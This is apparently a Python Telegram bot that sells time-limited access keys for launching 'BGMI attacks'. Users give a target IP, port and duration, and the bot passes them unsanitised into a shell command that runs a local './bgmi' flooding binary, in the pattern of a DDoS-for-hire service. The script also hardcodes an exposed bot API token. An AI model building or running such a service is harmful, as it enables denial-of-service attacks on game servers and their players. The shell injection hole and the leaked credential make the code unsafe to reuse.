import telebot
import time
import ntplib
import hashlib
import subprocess
import secrets
import datetime
import threading
import os
from io import BytesIO
from collections import defaultdict

API_TOKEN = '7372203940:AAHpMpgKrnQLozkLARcrZAbsBLAfptWNpxU'
ADMIN_ID = '6904449442'
DEFAULT_KEY = 'NINJA'
OWNER_ID = '6904449442'  # Add your Telegram user ID here

bot = telebot.TeleBot('7372203940:AAHpMpgKrnQLozkLARcrZAbsBLAfptWNpxU')

start_time = time.time()
user_verified_keys = {}  # Stores valid keys with their expiry time
user_verified_ids = set()  # Stores IDs of users who have verified their keys
claimed_keys = set()  # Store claimed keys
locked_users = {}  # Store locked user IDs with their unlock time
command_usage = defaultdict(list)  # Track command usage times for each user
failed_attempts = defaultdict(int)  # Track failed key entry attempts
total_attacks = 0  # Track the total number of attacks
active_attacks = {}  # Track active attacks by user ID

LOG_FILE = "log.txt"

def watermark_message(message):
    return f"{message}\n\n🔒 Bot made and developed by @NINJA666"

def get_uptime():
    uptime_seconds = time.time() - start_time
    return str(datetime.timedelta(seconds=uptime_seconds))


@bot.message_handler(commands=['start'])
def handle_start(message):
    if str(message.from_user.id) == ADMIN_ID:
        welcome_message = """
🚀 **Welcome to the VIP Bot!** 

To get started, please follow the steps below:

1. **Enter Access Key:**
   Use the command `/enter_key <key>` to verify your access.
   If you don't have an access key, you can purchase one from @NINJA666.

2. **Available Commands:**
   Use the command `/help` to see the list of available commands for users.

**Admin Commands:**
/add_key <key> <expiry_hours> - Manually add a key with expiry time in hours.
/remove_key <key> - Remove an existing key.
/generate_key - Generate a new access key.
/active_keys - View all active keys with expiration times.

If you have any questions or need assistance, feel free to contact the creator @NINJA666. Enjoy using the bot! 🤖
"""
    else:
        welcome_message = """
🚀 **Welcome to the VIP Bot!** 

To get started, please follow the steps below:

1. **Enter Access Key:**
   Use the command `/enter_key <key>` to verify your access.
   If you don't have an access key, you can purchase one from @NINJA666.

2. **Available Commands:**
   Use the command `/help` to see the list of available commands for users.

If you have any questions or need assistance, feel free to contact the creator @NINJA666. Enjoy using the bot! 🤖
"""
    bot.send_message(message.chat.id, welcome_message)

@bot.message_handler(commands=['generate_key'])
def handle_generate_key(message):
    if str(message.from_user.id) != ADMIN_ID:
        bot.reply_to(message, "❌ *You Are Not Authorized To Use This Command* ❌")
        return

    command = message.text.split()
    num_keys = int(command[1]) if len(command) > 1 else 1

    generated_keys = [hashlib.sha256(secrets.token_bytes(32)).hexdigest() for _ in range(num_keys)]
    keys_message = "🔑 Generated keys:\n" + "\n".join([f"<code>{key}</code>" for key in generated_keys])

    bot.send_message(message.chat.id, keys_message, parse_mode="HTML")

@bot.message_handler(commands=['add_key'])
def handle_add_key(message):
    if str(message.from_user.id) != ADMIN_ID:
        bot.reply_to(message, "❌ *You Are Not Authorized To Use This Command* ❌")
        return

    command = message.text.split()
    if len(command) != 3:
        bot.reply_to(message, "✅ *Usage:* `/add_key <key> <expiry_hours>`")
        return

    key = command[1]
    expiry_hours = int(command[2])

    if key in user_verified_keys:
        bot.reply_to(message, "❌ *Key already exists.*")
        return

    expiry_time = time.time() + expiry_hours * 3600
    user_verified_keys[key] = expiry_time
    bot.send_message(message.chat.id, f"🔑 *Key added successfully.*\n*Key:* `{key}`, *Expiry Time:* `{expiry_hours} hours`")
    bot.send_message(OWNER_ID, f"🔑 Added key by bot {message.chat.id}: `{key}` with expiry `{expiry_hours} hours`", parse_mode="Markdown")

@bot.message_handler(commands=['remove_key'])
def handle_remove_key(message):
    if str(message.from_user.id) != ADMIN_ID:
        bot.reply_to(message, "❌ *You Are Not Authorized To Use This Command* ❌")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "✅ *Usage:* `/remove_key <key>`")
        return

    key = command[1]
    if key in user_verified_keys:
        del user_verified_keys[key]
        bot.reply_to(message, f"🔑 *Key removed successfully.*\n*Key:* `{key}`")
        bot.send_message(OWNER_ID, f"🔑 Removed key by bot {message.chat.id}: `{key}`", parse_mode="Markdown")
    else:
        bot.reply_to(message, f"❌ *Key not found.*\n*Key:* `{key}`")

@bot.message_handler(commands=['enter_key'])
def handle_enter_key(message):
    if is_user_locked(message.from_user.id):
        bot.reply_to(message, watermark_message("❌ You are locked out due to suspicious activity. Please contact the administrator."))
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, watermark_message("✅ *Usage:* `/enter_key <key>`"))
        return

    key = command[1]
    if key == DEFAULT_KEY or (key in user_verified_keys and user_verified_keys[key] > time.time()):
        bot.reply_to(message, watermark_message("✅ Key verified successfully. You can now use the bot commands."))
        user_verified_ids.add(message.from_user.id)
        return
    elif key in claimed_keys:
        bot.reply_to(message, watermark_message("❌ This key has already been claimed and cannot be used again."))
        return

    # Add the key to the set of claimed keys
    claimed_keys.add(key)
    bot.reply_to(message, watermark_message("✅ Key verified successfully. You can now use the bot commands."))
    user_verified_ids.add(message.from_user.id)
    bot.send_message(OWNER_ID, f"🔑 Entered key by bot {message.chat.id}: `{key}`", parse_mode="Markdown")

@bot.message_handler(commands=['stop'])
def handle_stop(message):
    if str(message.from_user.id) != ADMIN_ID:
        bot.reply_to(message, watermark_message("❌ *You Are Not Authorized To Use This Command* ❌"))
        return

    bot.reply_to(message, watermark_message("🛑 *Bot is stopping...*"))
    os._exit(0)

@bot.message_handler(commands=['help'])
def handle_help(message):
    if str(message.from_user.id) == ADMIN_ID:
        help_message = """
🚀 **VIP Bot Help Menu - Admin Commands**:
1. **/generate_key** - Generate a new access key.
2. **/add_key <key> <expiry_hours>** - Manually add a key with expiry time in hours.
3. **/remove_key <key>** - Remove an existing key.
4. **/active_keys** - View all active keys with expiration times.
5. **/uptime** - Check the bot's uptime.
6. **/stop** - Stop the bot.
7. **/stat** - Show bot statistics.
8. **/download_keys** - Download all keys as a text file.

**User Commands**:
1. **/enter_key <key>** - Enter an access key to verify.
2. **/uptime** - Check the bot's uptime.
3. **/help** - Show this help message.
4. **/bgmi <target> <port> <time>** - Start a BGMI attack (requires key verification).
"""
    else:
        help_message = """
🚀 **VIP Bot Help Menu - User Commands**:
1. **/enter_key <key>** - Enter an access key to verify.
2. **/uptime** - Check the bot's uptime.
3. **/help** - Show this help message.
4. **/bgmi <target> <port> <time>** - Start a BGMI attack (requires key verification).
"""
    bot.reply_to(message, watermark_message(help_message))
    return  # Ensure the function exits after sending the message



def generate_keys_file():
    keys_content = ""
    for key, expiry in user_verified_keys.items():
        keys_content += f"Key: {key}, Expiry Time: {expiry}\n"
    return keys_content

@bot.message_handler(commands=['download_keys'])
def handle_download_keys(message):
    keys_content = generate_keys_file()
    keys_file = BytesIO(keys_content.encode())
    keys_file.name = "keys.txt"
    bot.send_document(message.chat.id, keys_file)

@bot.message_handler(commands=['active_keys'])
def handle_active_keys(message):
    active_keys_message = "🔑 **Active Keys:**\n"
    for key, expiry in user_verified_keys.items():
        if expiry > time.time():
            active_keys_message += f"Key: `{key}`, Expiry Time: {datetime.datetime.fromtimestamp(expiry).strftime('%Y-%m-%d %H:%M:%S')}\n"

    # Use watermark_message function to format the active_keys_message
    active_keys_message = watermark_message(active_keys_message)

    bot.reply_to(message, active_keys_message)

    download_link = "/download_keys"  # Change this to your command for downloading keys
    bot.send_message(message.chat.id, f"Click [here]({download_link}) to download all keys as a text file.", parse_mode="Markdown")



def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def start_attack_reply(message, target, port, time_duration):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name

    response = f"""
🎩 **VIP BGMI Attack Initiated!**

**Target:** `{target}`
**Port:** `{port}`
**Duration:** `{time_duration} seconds`

🛡️ **Status:** Attack is now running...

🔧 **Support:** For any assistance, contact @NINJA666.
"""
    # Adding watermark to the response
    response = watermark_message(response)

    bot.reply_to(message, response, parse_mode="Markdown")

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = message.from_user.id

    # Check if the user is an admin
    if str(user_id) == ADMIN_ID:
        pass  # Admins can execute BGMI command without a key
    elif user_id not in user_verified_ids:
        response_message = "❌ You are not authorized to use this command. Please verify your access key using `/enter_key <key>`."
        bot.reply_to(message, response_message)
        return

    if user_id in active_attacks:
        response_message = "❌ You already have an active attack. Please wait for it to finish before starting a new one."
        bot.reply_to(message, response_message)
        return

    command = message.text.split()
    if len(command) == 4:  # Check for target, port, and time
        target = command[1]
        port = int(command[2])  # Convert port to integer
        time_duration = int(command[3])  # Convert time to integer

        if time_duration > 5000:
            response = "Error: Time interval must be less than 5000."
        else:
            log_command(user_id, target, port, time_duration)
            start_attack_reply(message, target, port, time_duration)
            active_attacks[user_id] = True

            def run_attack():
                full_command = f"./bgmi {target} {port} {time_duration} 590"
                subprocess.run(full_command, shell=True)
                active_attacks.pop(user_id, None)
                bot.send_message(user_id, f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time_duration}")

            threading.Thread(target=run_attack).start()
            response = f"BGMI Attack is running. Target: {target} Port: {port} Time: {time_duration}"
    else:
        response = "Usage: /bgmi <target> <port> <time>"

    bot.reply_to(message, watermark_message(response))



                 
@bot.message_handler(commands=['stat'])
def handle_stat(message):
    if str(message.from_user.id) != ADMIN_ID:
        bot.reply_to(message, "❌ *You Are Not Authorized To Use This Command* ❌")
        return

    total_users = len(command_usage)
    verified_users = len(user_verified_ids)
    active_keys = len(user_verified_keys)
    banned_users = len(locked_users)
    
    stat_message = f"""
📊 **Bot Statistics**:
- **Current Users Online**: {total_users}
- **Total Verified Users**: {verified_users}
- **Total Attacks**: {total_attacks}
- **Claimed Keys**: {len(claimed_keys)}
- **Active Keys**: {active_keys}
- **Banned Users**: {banned_users}
    """

    bot.reply_to(message, watermark_message(stat_message))


def check_key_expiry():
    while True:
        current_time = time.time()
        expired_keys = [key for key, expiry_time in user_verified_keys.items() if expiry_time < current_time]
        for key in expired_keys:
            del user_verified_keys[key]
        time.sleep(3600)  # Check for expired keys every hour

def unlock_users():
    while True:
        current_time = time.time()
        unlocked_users = [user_id for user_id, lock_time in locked_users.items() if lock_time < current_time]
        for user_id in unlocked_users:
            del locked_users[user_id]
            bot.send_message(user_id, "🔓 You have been unlocked. You can now use the bot again.")
        time.sleep(600)  # Check every 10 minutes

def main():
    while True:
        try:
            threading.Thread(target=check_key_expiry, daemon=True).start()
            threading.Thread(target=unlock_users, daemon=True).start()
            bot.polling()
        except Exception as e:
            print(f"Error occurred: {e}")
            print("Restarting the bot in 10 seconds...")
            time.sleep(10)  # Wait for 10 seconds before restarting

if __name__ == "__main__":
    main()

